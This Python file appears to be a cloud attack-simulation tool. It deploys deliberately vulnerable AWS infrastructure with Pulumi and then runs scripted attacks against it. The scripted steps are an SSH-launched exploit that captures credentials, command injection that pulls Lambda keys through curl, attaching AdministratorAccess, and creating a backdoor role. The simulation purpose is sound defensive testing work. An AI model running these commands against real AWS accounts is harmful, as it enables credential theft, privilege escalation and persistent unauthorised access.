import os
import pyfiglet
import time
import subprocess
import json
from tqdm import tqdm
from time import sleep
from termcolor import colored
from .report import gen_report
from .report import gen_report_2

def loading_animation():
    chars = "/—\\|"
    for _ in range(10):
        for char in chars:
            print(f"\rLoading {char}", end="", flush=True)
            time.sleep(0.1)

def generate_ssh_key():
    # Define the path to save the keys
    key_path = os.path.expanduser("./id_rsa")

    # Check if SSH key already exists
    if os.path.exists(key_path):
        print("SSH key already exists. Deleting the existing key...")
        os.remove(key_path)

    # Generate the SSH key pair
    with open(os.devnull, 'w') as devnull:
        subprocess.run(["ssh-keygen", "-t", "rsa", "-b", "4096", "-N", "", "-f", key_path], stdout=devnull, stderr=devnull)
    print("SSH Key Pair generated successfully!")

    return key_path, key_path + ".pub"

    
def scenario_1_execute():
    print("-"*30)
    print(colored("Executing Scenraio 1 : Exploit Vulnerable Application, EC2 takeover, Credential Exfiltration & Anomalous Compute Provisioning ", color="red"))
    generate_ssh_key()
    loading_animation()
    print("-"*30)
    print(colored("Rolling out Infra", color="red"))
    loading_animation()
    print("-"*30)
    file_path = "./core/aws-scenario-1-output.json"
    if os.path.exists(file_path):
        os.remove(file_path)
        print("File '{}' found and deleted.".format(file_path))
    else:
        print("File '{}' not found.".format(file_path))
    subprocess.call("cd ./infra/scenario-1/ && pulumi up -s aws-scenario-1 -y", shell=True)
    subprocess.call("cd ./infra/scenario-1/ && pulumi stack -s aws-scenario-1 output --json >> ../../core/aws-scenario-1-output.json", shell=True)
    
    print("-"*30)
    print(colored("Bringing up the Vulnerable Application", color="red"))
    loading_animation()

    # Use tqdm as a context manager to create the progress bar
    sleep_duration = 300
    with tqdm(total=sleep_duration, desc="Loading") as pbar:
        # Loop until sleep_duration is reached
        while sleep_duration > 0:
            # Sleep for a shorter interval to update the progress bar
            sleep_interval = min(1, sleep_duration)
            sleep(sleep_interval)
            
            # Update the progress bar with the elapsed time
            pbar.update(sleep_interval)
            sleep_duration -= sleep_interval

    print("-"*30)
    print(colored("Export Meta Data of Infra", color="red"))

    print("-"*30)
    print(colored("Get into the attacker machine - Tor Node", color="red"))
    loading_animation()

    with open("./core/aws-scenario-1-output.json", "r") as file:
        data = json.load(file)

    ATTACKER_SERVER_PUBLIC_IP = data["Attacker Server Public IP"]
    WEB_SERVER_PUBLIC_IP = data["Web Server Public IP"]
    ATTACKER_SERVER_INSTANCE_ID = data["Attacker Server Instance ID"]
    WEB_SERVER_INSTANCE_ID = data["Web Server Instance ID"]
    SUBNET_ID = data["Subnet ID"]
    AMI_ID = data["AMI ID"]
    KEY_PAIR_NAME = data["Key Pair Name"]

    print("Web Server Public IP: ", WEB_SERVER_PUBLIC_IP)

    print("-"*30)
    print(colored("Running exploit on Remote Web Server", color="red"))
    loading_animation()
    subprocess.call("ssh -o 'StrictHostKeyChecking accept-new' -i ./id_rsa ubuntu@"+ATTACKER_SERVER_PUBLIC_IP+" 'sudo python3 exploit.py "+WEB_SERVER_PUBLIC_IP+" > /home/ubuntu/.aws/credentials'", shell=True)

    print("-"*30)
    print(colored("Initiate EC2 takeover, got Shell Access", color="red"))
    loading_animation()

    print("-"*30)
    print(colored("Exfiltrate Node Role Credentials and loading Creds in Attackers Machine", color="red"))
    loading_animation()

    print("-"*30)
    print(colored("Role Details", color="red"))
    loading_animation()
    subprocess.call("ssh -o 'StrictHostKeyChecking accept-new' -i ./id_rsa ubuntu@"+ATTACKER_SERVER_PUBLIC_IP+" 'aws sts get-caller-identity'", shell=True)

    print("-"*30)
    print(colored("Anomalous Infra Rollout", color="red"))
    loading_animation()
    subprocess.call("ssh -o 'StrictHostKeyChecking accept-new' -i ./id_rsa ubuntu@"+ATTACKER_SERVER_PUBLIC_IP+" ""aws ec2 run-instances --image-id "+AMI_ID+" --instance-type t2.micro --key-name "+KEY_PAIR_NAME+"  --subnet-id "+SUBNET_ID+" --region ap-south-1 | jq '.Instances[].InstanceId'""", shell=True)

    print("-"*30)
    print(colored("Generating Report", color="red"))
    loading_animation()
    gen_report(ATTACKER_SERVER_INSTANCE_ID, ATTACKER_SERVER_PUBLIC_IP, WEB_SERVER_PUBLIC_IP, WEB_SERVER_INSTANCE_ID)

def scenario_2_execute():
    print("-"*30)
    print(colored("Executing Scenraio 2 : Rest API exploit - command injection, credential exfiltration from backend lambda and privilige escalation, rogue identity creation & persistence ", color="red"))

    print(colored("Rolling out Infra", color="red"))
    loading_animation()
    print("-"*30)

    file_path = "./core/aws-scenario-2-output.json"
    if os.path.exists(file_path):
        os.remove(file_path)
        print("File '{}' found and deleted.".format(file_path))
    else:
        print("File '{}' not found.".format(file_path))

    subprocess.call("cd ./infra/scenario-2/ && pulumi up -s aws-scenario-2 -y", shell=True)
    subprocess.call("cd ./infra/scenario-2/ && pulumi stack -s aws-scenario-2 output --json >> ./../../core/aws-scenario-2-output.json", shell=True)

    with open("./core/aws-scenario-2-output.json", "r") as file:
        data = json.load(file)

    API_GW_URL = data["apigateway-rest-endpoint"]
    LAMBDA_ROLE_NAME = data["lambda-role-name"]
    API_GW_ID = data["api-gateway-id"]
    LAMBDA_FUNC_ARN = data["lambda-func-name"]

    print(colored("Exploiting the Application on API GW", color="red"))
    loading_animation()
    print("-"*30)   

    print(colored("Detected OS Injection through API GW, lambda backend, attempting credential exfil", color="red"))
    loading_animation()
    print("-"*30)   

    subprocess.call("curl '"+API_GW_URL+"?query=env' | grep -e AWS_ACCESS_KEY_ID -e AWS_SECRET_ACCESS_KEY -e AWS_SESSION_TOKEN >> token.txt", shell=True)
    print(colored("Successfuly Exifiltrated Lambda Role Creds", color="red"))
    loading_animation()
    print("-"*30)   

    creds = "export $(grep -e AWS_ACCESS_KEY_ID -e AWS_SECRET_ACCESS_KEY -e AWS_SESSION_TOKEN token.txt)"
    subprocess.call(""+creds+" && aws sts get-caller-identity", shell=True)
    
    print(colored("PrivEsc possible through this credential, Escalating role privileges", color="red"))
    subprocess.call(""+creds+" && aws iam attach-role-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --role-name "+LAMBDA_ROLE_NAME+"", shell=True)
    sleep_duration = 60
    with tqdm(total=sleep_duration, desc="Loading") as pbar:
        # Loop until sleep_duration is reached
        while sleep_duration > 0:
            # Sleep for a shorter interval to update the progress bar
            sleep_interval = min(1, sleep_duration)
            sleep(sleep_interval)
            
            # Update the progress bar with the elapsed time
            pbar.update(sleep_interval)
            sleep_duration -= sleep_interval

    subprocess.call("curl '"+API_GW_URL+"?query=ping'", shell=True)
    print(colored("Creating a Backdoor Role which can be assumed from custom AWS account", color="red"))
    loading_animation()
    print("-"*30)
    subprocess.call(""+creds+" && aws iam create-role --role-name monitoring-metrics --assume-role-policy-document file://infra/scenario-2/assume-role-trust-policy.json", shell=True)
    subprocess.call(""+creds+" && aws iam attach-role-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --role-name monitoring-metrics", shell=True)

    gen_report_2(API_GW_ID, LAMBDA_FUNC_ARN, API_GW_URL, LAMBDA_ROLE_NAME)

    subprocess.call("rm token.txt", shell=True)


def print_ascii_art(text):
    ascii_art = pyfiglet.figlet_format(text)
    print(colored(ascii_art, color="cyan"))

def select_cloud_provider():
    print(colored("Select Cloud Provider:", color="yellow"))
    print(colored("1. AWS", color="green")) 
    print(colored("2. Azure", color="green"))
    print(colored("3. GCP", color="green"))
    while True:
        try:
            choice = int(input(colored("Enter your choice (1/2/3): ", color="yellow")))
            if choice not in [1, 2, 3]:
                raise ValueError(colored("Invalid choice. Please enter 1, 2, or 3.", color="red"))
            return choice
        except ValueError as e:
            print(e)

def select_attack_scenario(cloud_provider):
    print(colored("Select Attack Scenario of %s:", color="yellow") % cloud_provider)
    print(colored("1. Exploit Vulnerable Application, EC2 takeover, Credential Exfiltration & Anomalous Compute Provisioning", color="green"))
    print(colored("2. Rest API exploit - command injection, credential exfiltration from backend lambda and privilige escalation, rogue identity creation & persistence", color="green"))
    while True:
        try:
            choice = int(input(colored("Enter your choice: ", color="yellow")))
            if choice not in [1, 2]:
                raise ValueError(colored("Invalid choice. Please enter 1 or 2.", color="red"))
            return choice
        except ValueError as e:
            print(e)

def get_credentials():
    while True:
        try:
            access_key = input(colored("Enter Access Key: ", color="yellow"))
            if not access_key:
                raise ValueError(colored("Access Key cannot be empty.", color="red"))
            secret_key = input(colored("Enter Secret Key: ", color="yellow"))
            if not secret_key:
                raise ValueError(colored("Secret Key cannot be empty.", color="red"))
            return access_key, secret_key
        except ValueError as e:
            print(e)

def execute_scenario(x):
    try:
        # Call the scenario function from the imported module
        if x == 1:
            scenario_1_execute()
        elif x == 2:
            scenario_2_execute()
        else: 
            print("Invalid Scenario Selected")
        print(colored("Scenario executed successfully!", color="green"))
    except Exception as e:
        print(colored("Error executing scenario:", color="red"), str(e))

def main(cloud_provider, action, simulation, scenario):
    tool_name = "C N B A S"
    print(scenario)
    print_ascii_art(tool_name)
    if cloud_provider == 'aws':
        if action == 'launch':
            if simulation is True:
                scenario_choice = select_attack_scenario(cloud_provider)
                if scenario_choice == 1:
                    # Pass the selected scenario module to execute
                    execute_scenario(1)
                elif scenario_choice == 2:
                    execute_scenario(2)
                    #print(colored("Scenario coming soon!", color="yellow"))
        elif action == 'status' and scenario == "scenario-1":
            subprocess.call("cd ./infra/scenario-1/ && pulumi stack ls", shell=True)
        elif action == 'status' and scenario == "scenario-2":
            subprocess.call("cd ./infra/scenario-2/ && pulumi stack ls", shell=True)
        elif action == 'destroy' and scenario == "scenario-1":
            subprocess.call("cd ./infra/scenario-1/ && pulumi destroy", shell=True)
        elif action == 'destroy' and scenario == "scenario-2":
            subprocess.call("cd ./infra/scenario-2/ && pulumi destroy", shell=True)    
        else:
            print('No options provided. --help to know more')

if __name__ == "__main__":
    main()
